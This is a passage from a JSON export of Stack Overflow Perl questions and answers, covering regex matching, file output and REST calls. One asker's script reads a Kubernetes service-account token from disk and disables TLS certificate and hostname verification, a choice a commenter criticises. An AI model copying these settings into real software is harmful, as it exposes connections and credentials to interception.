$sign.$count.$1; \n}    \nsay for @matches;\n\nmy $matches_re = '(?:' . join('|', map { quotemeta } @matches) . ')';\n\n$string =~ s/$matches_re//g;    \nsay $string;\n</code></pre>\n\n<p>where i've now joined the sign <code>[+-]</code> to the match.</p>\n\n<p>It prints</p>\n\n<pre>\n+2ca\n-3acg\n+1t\nac.,.aa..a.cgt\n</pre>\n"}], "owner": {"reputation": 23, "user_id": 12432157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efef733f8cee2212aeabc4dba7357cda?s=128&d=identicon&r=PG&f=1", "display_name": "berutti", "link": "https://stackoverflow.com/users/12432157/berutti"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "accepted_answer_id": 59040214, "answer_count": 2, "score": 2, "last_activity_date": 1575361623, "creation_date": 1574715503, "question_id": 59039993, "link": "https://stackoverflow.com/questions/59039993/perl-match-with-regex-a-number-and-as-many-following-characters-as-the-number-sp", "title": "Perl match with regex a number and as many following characters as the number specifies within a string", "body": "<p>I (think I) am quite experienced in Perl, still I have a nasty question I'm trying to solve.\nI have to match a string (whose format I cannot change coming out from a bioinformatic software) in this format:</p>\n\n<pre><code>[\\+\\-][0-9]+[ACGTacgt]+\n</code></pre>\n\n<p>Actually this would be easy, though the number of repeats of the pattern <code>[ACGTacgt]</code> is not quite 1 or more but the number defined by <code>[0-9]+</code> \nso it can be </p>\n\n<pre><code>[...whatever...]+2ac[...whatever...]\n+4acta\n+3atg\n</code></pre>\n\n<p>etc..</p>\n\n<p>Now to test if the regex work I'm just playing with a substitution and I tried the following way:</p>\n\n<pre><code>$mystring =~ s/[\\+\\-]([0-9]+)[ACGTacgt]{\\1}//g\n</code></pre>\n\n<p>Unfortunately this guy above does not work and I get an error complaining about unescaped braces. Indeed if I define a proper number instead of \\1 the thing works:</p>\n\n<pre><code>$mystring =~ s/[\\+\\-]([0-9]+)[ACGTacgt]{1}//g\n</code></pre>\n\n<p>I need it to work since the format might contain sequences like <code>ac.,.+2caaa..a.c</code> from which I have to get exactly the <code>+2ca</code> leaving separately from the rest.</p>\n\n<p>Is it possible in one step, or there's a logical reason which I'm missing right now for which it's not possible?</p>\n\n<p>Thanks for any help or suggestions! </p>\n\n<p>berutti</p>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 2, "creation_date": 1574712898, "post_id": 59039406, "comment_id": 104321534, "body": "Not the answer but some critiques, you should always use strict and warnings, and use lexical filehandles instead of barewords (<code>open my $infile, &#39;&lt;&#39;, $input_file ... &lt;$infile&gt;</code>). Iterate through the filehandle in the while loop condition itself because Perl has some special handling there: <code>while (my $in_line = &lt;$infile&gt;) {</code>. That will internally check if the result is defined, because you want to iterate until undef, which is different from the empty string."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 1, "creation_date": 1574713162, "post_id": 59039406, "comment_id": 104321640, "body": "You say the output is all concatenated together, but that is not the result I get with your code. I get each number on its own line."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574713309, "post_id": 59039406, "comment_id": 104321690, "body": "The warnings in this case are all harmless, but indicate parts that could be improved."}, {"owner": {"reputation": 460, "user_id": 1546132, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/293209332d895fb60448e72b44ad5810?s=128&d=identicon&r=PG", "display_name": "s0me0ne", "link": "https://stackoverflow.com/users/1546132/s0me0ne"}, "edited": false, "score": 0, "creation_date": 1574728764, "post_id": 59039406, "comment_id": 104326473, "body": "Trying some telepathy: probably you&#39;re viewing your output file with a Windows editor which does not display <code>\\n</code> Unix string separator correctly?"}, {"owner": {"reputation": 1, "user_id": 12431970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0177357a431ad8f76a0aa10a80d6e15a?s=128&d=identicon&r=PG&f=1", "display_name": "sonla", "link": "https://stackoverflow.com/users/12431970/sonla"}, "edited": false, "score": 0, "creation_date": 1574784157, "post_id": 59039406, "comment_id": 104349472, "body": "#s0me0ne: You are correct - Window editor is the reason I did not see my output file correctly."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 12431970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0177357a431ad8f76a0aa10a80d6e15a?s=128&d=identicon&r=PG&f=1", "display_name": "sonla", "link": "https://stackoverflow.com/users/12431970/sonla"}, "edited": false, "score": 0, "creation_date": 1574784480, "post_id": 59039825, "comment_id": 104349666, "body": "I want each number on one line by itself - It turned out the &quot;\\n&quot; did not work with Windows text editor.  Thank you for your suggestion"}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "reply_to_user": {"reputation": 1, "user_id": 12431970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0177357a431ad8f76a0aa10a80d6e15a?s=128&d=identicon&r=PG&f=1", "display_name": "sonla", "link": "https://stackoverflow.com/users/12431970/sonla"}, "edited": false, "score": 0, "creation_date": 1574839495, "post_id": 59039825, "comment_id": 104368527, "body": "If you use Windows (or DOS bases system) you need to use &quot;\\r\\n&quot; in place of &quot;\\n&quot;.  <a href=\"https://www.altap.cz/salamander/help/salamand/appendix_txtfiles/\" rel=\"nofollow noreferrer\">altap.cz/salamander/help/salamand/appendix_txtfiles</a>"}], "tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": -2, "last_activity_date": 1574717252, "last_edit_date": 1574717252, "creation_date": 1574714656, "answer_id": 59039825, "question_id": 59039406, "link": "https://stackoverflow.com/questions/59039406/writing-an-array-to-a-text-file-in-perl/59039825#59039825", "title": "Writing an array to a text file in perl", "body": "<p>Your question is not clear on final output. Is all numbers should be on one line without any <em>separator</em> between?</p>\n\n<p>NOTE: I use DATA block as input instead of file, you still need to provide output filename as a parameter. I implemented <em>crude</em> reminder if you forget to provide filename.</p>\n\n<pre><code>use strict;\nuse warnings;\n\n#my $filename = shift\n#       or die \"\\n\\nUsage:\\n\\t$0 [IN] [OUT]\\n\\n\\tWhere [IN] and [OUT] are files\\n\";\n#\n#open DATA, \"&lt; $filename\"\n#       or die \"Couldn't open $filename\";\n\nmy $out = shift\n        or die \"Provide name for output file\";\n\nopen OUT, \"&gt; $out\"\n        or die \"Couldn't open $out\";\n\nwhile( &lt;DATA&gt; ) {\n    chomp;\n    my @array = split ' ';\n\n    print \"Array size: \" . (1+$#array) . \"\\n\";\n\n    my $count = 0;\n\n    map { print \"element[$count] = $_\\n\"; \n          print OUT \"$_ \"; \n          $count++\n        } @array; \n\n    print \"\\n\";\n}\n\nprint OUT \"\\n\";\n\nclose OUT;\n\n__DATA__\n20 21 22 23 \n30 31\n40 41 42\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 12431970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0177357a431ad8f76a0aa10a80d6e15a?s=128&d=identicon&r=PG&f=1", "display_name": "sonla", "link": "https://stackoverflow.com/users/12431970/sonla"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 161, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1574717252, "creation_date": 1574712630, "last_edit_date": 1574712947, "question_id": 59039406, "link": "https://stackoverflow.com/questions/59039406/writing-an-array-to-a-text-file-in-perl", "title": "Writing an array to a text file in perl", "body": "<p>I am a beginner as you can see.  My script prints out the debug line (1st print) to the console correctly but when it writes to a file (2nd print) everything from the input file is print to the output file in one single line. Example input file </p>\n\n<pre><code>20 21 22 23 \n30 31\n40 41 42\n</code></pre>\n\n<p>the output file is like this:</p>\n\n<pre><code>202122233031404142 \n</code></pre>\n\n<p>Any help is appreciated</p>\n\n<pre><code>my $input_file = \"test_input.txt\"; #input file name \nmy $output_file = \"ram_app_out.txt\"; #output file name\n\nunless (open (INFILE  , $input_file)){\n    die(\"can't not open input file\\n\");\n} \nunless (open (OUTFILE  , '&gt;&gt;', $output_file)){\n    die(\"can't not open output file\\n\");\n} \n\nmy $in_line = &lt;INFILE&gt;;\nmy $count = 1;\n\n\nwhile($in_line ne \"\"){\n    print (\"line number:$count -  $in_line\");\n\n    my @array = (split ' ', $in_line);\n    my $length = @array;\n    print (\"array length = $length)\");\n\n    for(my $i = 0; $i &lt; $length; $i++){\n    print (\"element[$i] = @array[$i]\\n\");\n    print (OUTFILE \"$array[$i]\\n\");\n    }\n\n    $count++;\n    $in_line  = &lt;INFILE&gt;;\n}\n\nclose $input_file;\nclose $output_file;\n</code></pre>\n"}, {"tags": ["rest", "perl", "subroutine"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574706715, "post_id": 59037480, "comment_id": 104318939, "body": "Which line do you say needs to be commented? How does it fail to work when it doesn&#39;t work?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574706907, "post_id": 59037480, "comment_id": 104319032, "body": "Note that I question the usefulness of <code>$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;</code> and <code>$ENV{PERL_NET_HTTPS_SSL_SOCKET_CLASS} = &quot;Net::SSL&quot;;</code> I&#39;m pretty sure that needs to be done earlier. I would place them in a <code>BEGIN</code> block before the <code>use</code> statements."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574707026, "post_id": 59037480, "comment_id": 104319088, "body": "Note that you shouldn&#39;t disable hostname verification. It defies the point of encrypting the connection by using HTTPS."}, {"owner": {"reputation": 21, "user_id": 11428360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be4da0b2280e8c3d7221a94ae5ec2300?s=128&d=identicon&r=PG&f=1", "display_name": "muku", "link": "https://stackoverflow.com/users/11428360/muku"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574708195, "post_id": 59037480, "comment_id": 104319596, "body": "@ikegami thanks for the reply. if i comment the below lines $client-&gt;setHost(&quot;https://${endpoint}&quot;);      #$client-&gt;addHeader(&#39;Authorization&#39;, &quot;Bearer ${token}&quot;);     $client-&gt;addHeader( &#39;Accept&#39;, &quot;application/json&quot; );"}, {"owner": {"reputation": 21, "user_id": 11428360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be4da0b2280e8c3d7221a94ae5ec2300?s=128&d=identicon&r=PG&f=1", "display_name": "muku", "link": "https://stackoverflow.com/users/11428360/muku"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574710156, "post_id": 59037480, "comment_id": 104320464, "body": "@ikegami thanks for the reply. if i comment the below lines it works. I am aware if i disable certificate valdiation its a risk but this is a just dev service          #$client-&gt;setHost(&quot;https://${endpoint}&quot;);     #$client-&gt;addHeader(&#39;Authorization&#39;, &quot;Bearer ${token}&quot;);     #$client-&gt;addHeader( &#39;Accept&#39;, &quot;application/json&quot; );"}, {"owner": {"reputation": 21, "user_id": 11428360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be4da0b2280e8c3d7221a94ae5ec2300?s=128&d=identicon&r=PG&f=1", "display_name": "muku", "link": "https://stackoverflow.com/users/11428360/muku"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574710189, "post_id": 59037480, "comment_id": 104320477, "body": "when it fails it throws the below error , looks like it could not connect to the service. malformed JSON string, neither array, object, number, string or atom, at character offset 0 (before &quot;Can&#39;t connect to api...&quot;) however from the print Dumper i could say headers are adding properly in the second subroutine"}, {"owner": {"reputation": 21, "user_id": 11428360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be4da0b2280e8c3d7221a94ae5ec2300?s=128&d=identicon&r=PG&f=1", "display_name": "muku", "link": "https://stackoverflow.com/users/11428360/muku"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574710287, "post_id": 59037480, "comment_id": 104320525, "body": "$VAR1 = bless( {                  &#39;_content&#39; =&gt; &#39;&#39;,                  &#39;_uri&#39; =&gt; bless( do{&#40;my $o = &#39;<a href=\"https://api.service.intranet.db.com/dap-api/rest/application/XXX/instance/dev/action?action=restart&amp;dc_data=test&amp;deploy=0&#39;\" rel=\"nofollow noreferrer\">api.service.intranet.db.com/dap-api/rest/application/XXX/&hellip;</a>)&zwnj;&#8203;}, &#39;URI::https&#39; ),                  &#39;_headers&#39; =&gt; bless( {                                         &#39;accept&#39; =&gt; &#39;<i>/</i>&#39;,                                         &#39;host&#39; =&gt; &#39;api.service.intranet.db.com:443&#39;,                                         &#39;authorization&#39; =&gt; &#39;DAP XXXXXX&#39;                                       }, &#39;HTTP::Headers&#39; ),                  &#39;_method&#39; =&gt; &#39;PUT"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574711295, "post_id": 59037480, "comment_id": 104320949, "body": "You should add something like <code>die($res-&gt;status_line) if !$res-&gt;is_success;</code> after the call to <code>-&gt;request</code>."}], "owner": {"reputation": 21, "user_id": 11428360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be4da0b2280e8c3d7221a94ae5ec2300?s=128&d=identicon&r=PG&f=1", "display_name": "muku", "link": "https://stackoverflow.com/users/11428360/muku"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 78, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1574859157, "creation_date": 1574704144, "last_edit_date": 1574859157, "question_id": 59037480, "link": "https://stackoverflow.com/questions/59037480/perl-rest-client-declaration-causes-failure-of-user-agent-call-with-custom-heade", "title": "Perl rest client declaration causes failure of user agent call with custom headers with another end point", "body": "<p>I have 2 subroutines called in a single perl program .</p>\n\n<p>First one (get_secrets)  I am using the perl REST client directly with custom header and second one (app_restart) I am using LWP user agent and make and HTTP call . </p>\n\n<p>my second subroutine fails when the $client header declaration is available in the first subroutine , as soon as i remove the that subroutine or comment the lines those lines  app_restart subroutine works fine .</p>\n\n<pre><code>use REST::Client;\nuse Data::Dumper;\nuse JSON;    #use strict;\nuse MIME::Base64 qw( decode_base64 );\nuse POSIX 'strftime';\nuse Date::Parse;\nuse DateTime;\nuse Date::Calc qw(:all);\nuse LWP::UserAgent;\n\n#use IO::Socket::SSL 'debug4';\nuse Data::Dumper qw(Dumper);\nuse Getopt::Long;\n\nsub toList {\n    my $data = shift;\n    my $key  = shift;\n    if ( ref( $data-&gt;{$key} ) eq 'ARRAY' ) {\n        $data-&gt;{$key};\n    }\n    elsif ( ref( $data-&gt;{$key} ) eq 'HASH' ) {\n        [ $data-&gt;{$key} ];\n    }\n    else {\n        [];\n    }\n}\n\n$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;\n\n$endpoint  = $ENV{'ENDPOINT'};\n$token     = `cat /var/run/secrets/kubernetes.io/serviceaccount/token`;\n$namespace = $ENV{'NAMESPACE'};\n$apikey    = $ENV{'APIKEY'};\n$instance  = $ENV{'INSTANCE'};\n$appid     = $ENV{'APPID'};\n$storeid   = \"checker\";\n\nsub get_secrets {\n    my $client = REST::Client-&gt;new();\n    $client-&gt;setHost(\"https://${endpoint}\");\n\n    #$client-&gt;addHeader('Authorization', \"Bearer ${token}\");\n    $client-&gt;addHeader( 'Accept', \"application/json\" );\n    $client-&gt;GET(\"/api/v1/namespaces/${namespace}/secrets?labelSelector=true\");\n\n}\n\nget_secrets();\n\n$ENV{PERL_NET_HTTPS_SSL_SOCKET_CLASS} = \"Net::SSL\";\nmy $ua = LWP::UserAgent-&gt;new( 'send_te' =&gt; '0' );\n$ua-&gt;ssl_opts(\n    SSL_verify_mode =&gt; IO::Socket::SSL::SSL_VERIFY_NONE,\n    SSL_hostname    =&gt; '',\n    verify_hostname =&gt; 0\n);\n\nsub app_restart {\n\n    $ENV{PERL_NET_HTTPS_SSL_SOCKET_CLASS} = \"Net::SSL\";\n    $ua = LWP::UserAgent-&gt;new( 'send_te' =&gt; '0' );\n    $ua-&gt;ssl_opts(\n        SSL_verify_mode =&gt; IO::Socket::SSL::SSL_VERIFY_NONE,\n        verify_hostname =&gt; 0\n\n    print \"$instance\\n\";\n    print \"$apikey\\n\";\n    print \"$cstoreid\\n\";\n    print \"$appid\\n\";\n    my $r = HTTP::Request-&gt;new(\n        'PUT' =&gt;\n\"https://api.service.intranet.com/rest/application/$appid/instance/$instance/action?action=restart&amp;config=$storeid&amp;deploy=0\",\n        [\n            'Accept'        =&gt; '*/*',\n            'Authorization' =&gt; \"Realm $apikey\",\n            'Host'          =&gt; 'api.service.intranet.com:443',\n            'User-Agent'    =&gt; 'curl/7.55.1',\n        ],\n\n    );\n    my $res = $ua-&gt;request( $r, );\n\n    #$response = $res-&gt;decoded_content;\n    $json             = JSON-&gt;new-&gt;allow_nonref;\n    $response_decoded = $json-&gt;decode( $res-&gt;decoded_content );\n    $actionID         = $response_decoded-&gt;{'action_id'};\n\n    print \"$actionID\\n\";\n\n}\napp_restart();\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1574699849, "post_id": 59036179, "comment_id": 104315589, "body": "Regex has no output, matching or substitution have. Why do you want to switch to substitution?"}, {"owner": {"reputation": 166, "user_id": 3399702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2ObF.jpg?s=128&g=1", "display_name": "Seth", "link": "https://stackoverflow.com/users/3399702/seth"}, "edited": false, "score": 0, "creation_date": 1574700438, "post_id": 59036179, "comment_id": 104315919, "body": "yes, regex values come from the <i>DATA</i>. I want to switch to substitution in order to clean up the line, like all of them are the same format."}, {"owner": {"reputation": 166, "user_id": 3399702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2ObF.jpg?s=128&g=1", "display_name": "Seth", "link": "https://stackoverflow.com/users/3399702/seth"}, "edited": false, "score": 0, "creation_date": 1574700631, "post_id": 59036179, "comment_id": 104316028, "body": "The <i>DATA</i> are the source, I made the expected output already into the hash. So the hash is the reference. Then I would like to have the same reference with the substitution"}], "answers": [{"tags": [], "owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "is_accepted": true, "score": 1, "last_activity_date": 1574704133, "last_edit_date": 1574704133, "creation_date": 1574702465, "answer_id": 59037051, "question_id": 59036179, "link": "https://stackoverflow.com/questions/59036179/perl-using-regex-in-the-same-way-that-the-hash/59037051#59037051", "title": "Perl: using regex in the same way that the hash", "body": "<p>This regex matches what you want and the substitute gives you the expected result, except the timestamp, you have to convert it like you did in the first part of your code:</p>\n\n<pre><code>^.+?(http://[^/]+).+/([^/]+?)/[^/]+?,(.+?),(.+?),(.+)\n</code></pre>\n\n<p>Replacement: <code>$3|$5|$4|$2|$1</code></p>\n\n<p><strong>Result:</strong></p>\n\n<pre><code>1574443147021|9836847|40EVFVRFB|DIZJ4432595.ts|http://pdzr.rt.pl:8889\n1574443138223|0292929|BVFEFZZ9C4|DIZJ4431573.ts|http://pdzr.rt.pl:8889\n</code></pre>\n\n<p><a href=\"https://regex101.com/r/CXkSi5/3\" rel=\"nofollow noreferrer\">Regex demo &amp; explanation</a></p>\n\n<p>Here is the perl code:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse POSIX qw(strftime);\n\nwhile (&lt;DATA&gt;) {\n    chomp $_;\n    s~                          # SUBSTITUTE\n        .+?                         # 1 or more any character but newline, not greedy\n        (http://[^/]+)              # group 1, URL until the first slash\n        .+/                         # 1 or more any character but newline until a slash\n        ([^/]+?)                    # group 2, 1 or more non slash\n        /[^/]+?,                    # a slash, 1 or more non slash, a comma\n        (.+?)                       # group 3, 1 or more any character but newline, not greedy\n        ,                           # a comma\n        (.+?)                       # group 4, 1 or more any character but newline, not greedy\n        ,                           # a comma\n        (.+)                        # group 5, 1 or more any character but newline\n    ~                           # WITH\n        strftime('%Y%m%d%H%M%S',    # convert time\n        localtime($3/1000))\n        .                           # CONCAT WITH\n        \"|$5|$4|$2|$1\"              # groups 5, 4, 2, 1 joined with pipes\n    ~ex;                            # \n    print $_, \"\\n\";\n}\n\n__DATA__\n\"@timestamp\",url,ts,macin,caid\n\"Nov 22, 2019 @ 17:19:07.571\",\"http://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4432595.ts/9836847.3018322401\",1574443147021,40EVFVRFB,9836847\n\"Nov 22, 2019 @ 17:18:59.264\",\"http://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4431573.ts/0292929.5002731501\",1574443138223,BVFEFZZ9C4,0292929\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>\"@timestamp\",url,ts,macin,caid\n20191122181907|9836847|40EVFVRFB|DIZJ4432595.ts|http://pdzr.rt.pl:8889\n20191122181858|0292929|BVFEFZZ9C4|DIZJ4431573.ts|http://pdzr.rt.pl:8889\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 0, "last_activity_date": 1574711888, "creation_date": 1574711888, "answer_id": 59039234, "question_id": 59036179, "link": "https://stackoverflow.com/questions/59036179/perl-using-regex-in-the-same-way-that-the-hash/59039234#59039234", "title": "Perl: using regex in the same way that the hash", "body": "<p>Well, there are many ways to achieve same result. Bellow is my <em>extended</em> version which not just <em>shuffle</em> around fields but separate them into hash and does some manipulation on them [timestamp]. </p>\n\n<p>From the original post it is not clear if <em>timestamp</em> should be taken from the data or generated at run time -- I took <em>timestamp</em> from data.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature qw(say);\n\nuse Data::Dumper;\n\nmy $debug = 0;\n\nmy %row;\nmy %url;\nmy @fields  = qw( timestamp url ts macin caid );\nmy @address = qw( proto dn port dir id );\n\nwhile( &lt;DATA&gt; ) {\n    next if /timestamp/;\n\n    print if $debug;\n\n    chomp;\n    s/,//;\n    s/\"//g;\n\n    @row{@fields} = split ',';\n\n    print Dumper(\\%row) if $debug;\n\n    @url{@address} = ( $row{url} =~ m#(\\w+)://(.+):(\\d+)/(.+)/(.+)# );\n\n    $url{id}    =~ s/\\.\\d+//;\n    $url{dir}   =~ /(\\w+\\.ts)/;\n    $url{ts}    = $1;\n\n    print Dumper(\\%url) if $debug;\n\n    say join('|', (\n            timestamp($row{timestamp}),\n            $url{id},\n            $row{macin},\n            $url{ts},\n            \"$url{proto}://$url{dn}:$url{port}\"\n            ));\n\n}\n\nsub timestamp {\n    my $input = shift;\n\n    my %data;\n    my $result;\n\n    my %months = ( Jan =&gt; 1, Feb =&gt; 2, Mar =&gt; 3, Apr =&gt; 4,\n                   May =&gt; 5, Jun =&gt; 6, Jul =&gt; 7, Aug =&gt; 8,\n                   Sep =&gt; 9, Oct =&gt; 10, Nov =&gt; 11, Dec =&gt; 12\n                 );\n\n    my @fields = qw( month day year hour min sec msec ); \n\n    @data{@fields} = /(\\w+)\\s+(\\d+)\\s+(\\d+)\\s+@\\s+(\\d+):(\\d+):(\\d+).(\\d+)/;\n\n    print Dumper(\\%data) if $debug;\n\n    $result = sprintf \"%4d%02d%02d%02d%02d\",\n                    $data{year},\n                    $months{$data{month}},\n                    $data{hour},\n                    $data{min},\n                    $data{sec};\n\n    return $result;\n}\n\n__DATA__\n\"@timestamp\",url,ts,macin,caid\n\"Nov 22, 2019 @ 17:19:07.571\",\"http://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4432595.ts/9836847.3018322401\",1574443147021,40EVFVRFB,9836847\n\"Nov 22, 2019 @ 17:18:59.264\",\"http://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4431573.ts/0292929.5002731501\",1574443138223,BVFEFZZ9C4,0292929\n</code></pre>\n\n<p>The output of the result</p>\n\n<pre><code>201911171907|9836847|40EVFVRFB|DIZJ4432595.ts|http://pdzr.rt.pl:8889\n201911171859|0292929|BVFEFZZ9C4|DIZJ4431573.ts|http://pdzr.rt.pl:8889\n</code></pre>\n"}], "owner": {"reputation": 166, "user_id": 3399702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2ObF.jpg?s=128&g=1", "display_name": "Seth", "link": "https://stackoverflow.com/users/3399702/seth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 59037051, "answer_count": 2, "score": 0, "last_activity_date": 1574711888, "creation_date": 1574699280, "question_id": 59036179, "link": "https://stackoverflow.com/questions/59036179/perl-using-regex-in-the-same-way-that-the-hash", "title": "Perl: using regex in the same way that the hash", "body": "<p>I would like to have the same output from regex that I already have with the hash below.\nI am aware that my regex is quite ugly but I'm trying to improve it.</p>\n\n<p>So the expect output from the regex is:</p>\n\n<pre><code>20191122181858|0292929|BVFEFZZ9C4|DIZJ4431573.ts|http://pdzr.rt.pl:8889\n20191122181907|9836847|40EVFVRFB|DIZJ4432595.ts|http://pdzr.rt.pl:8889\n</code></pre>\n\n<p><strong>Here the code:</strong></p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse POSIX qw(strftime);\n\nmy (%hash); # initialization\n\nif (&lt;DATA&gt;) { # if DATA exists\n        print \"here the regex values: \\n\";\n        while (&lt;DATA&gt;) { # open the DATA\n                chomp $_; # removes characters at the end of line\n                my @tab = split(/,/, $_); # split lines\n                my ($http, $ts, $macin, $caid) = (@tab[2, 3, 4, 5]);\n                my $timestamp = strftime '%Y%m%d%H%M%S', localtime($ts/1000); # from unix epoch time to human read-able date\n                my @value = split(/\\//, $http); # split values of the http\n                my ($url, $filename) = (\"http://$value[2]\", $value[6]); # value in order to have url and the name of the file\n                if (! $hash{$timestamp.\"|\".$caid.\"|\".$macin.\"|\".$filename.\"|\".$url}) { # starting hash in order to avoid duplicates\n                        $hash{$timestamp.\"|\".$caid.\"|\".$macin.\"|\".$filename.\"|\".$url} = $timestamp.\"|\".$caid.\"|\".$macin.\"|\".$filename.\"|\".$url;\n                }\n                my $regex = $_; # trying to have same output with a regex\n                $regex =~ s/(?:[^\\/]*\\/)([^\\\\*]*\\/)([^\\.*]*)([^\\,*]*)(\\,)([^\\,*]*)(\\,)(.*)(.*)/http:\\/$1|$2|$3|$4|$5|$6|$7/;\n                print $regex, \"\\n\";\n        }\n}\n\nif (%hash) { # checking if hahs exists and contains values\n        print \"\\nhere the hash values: 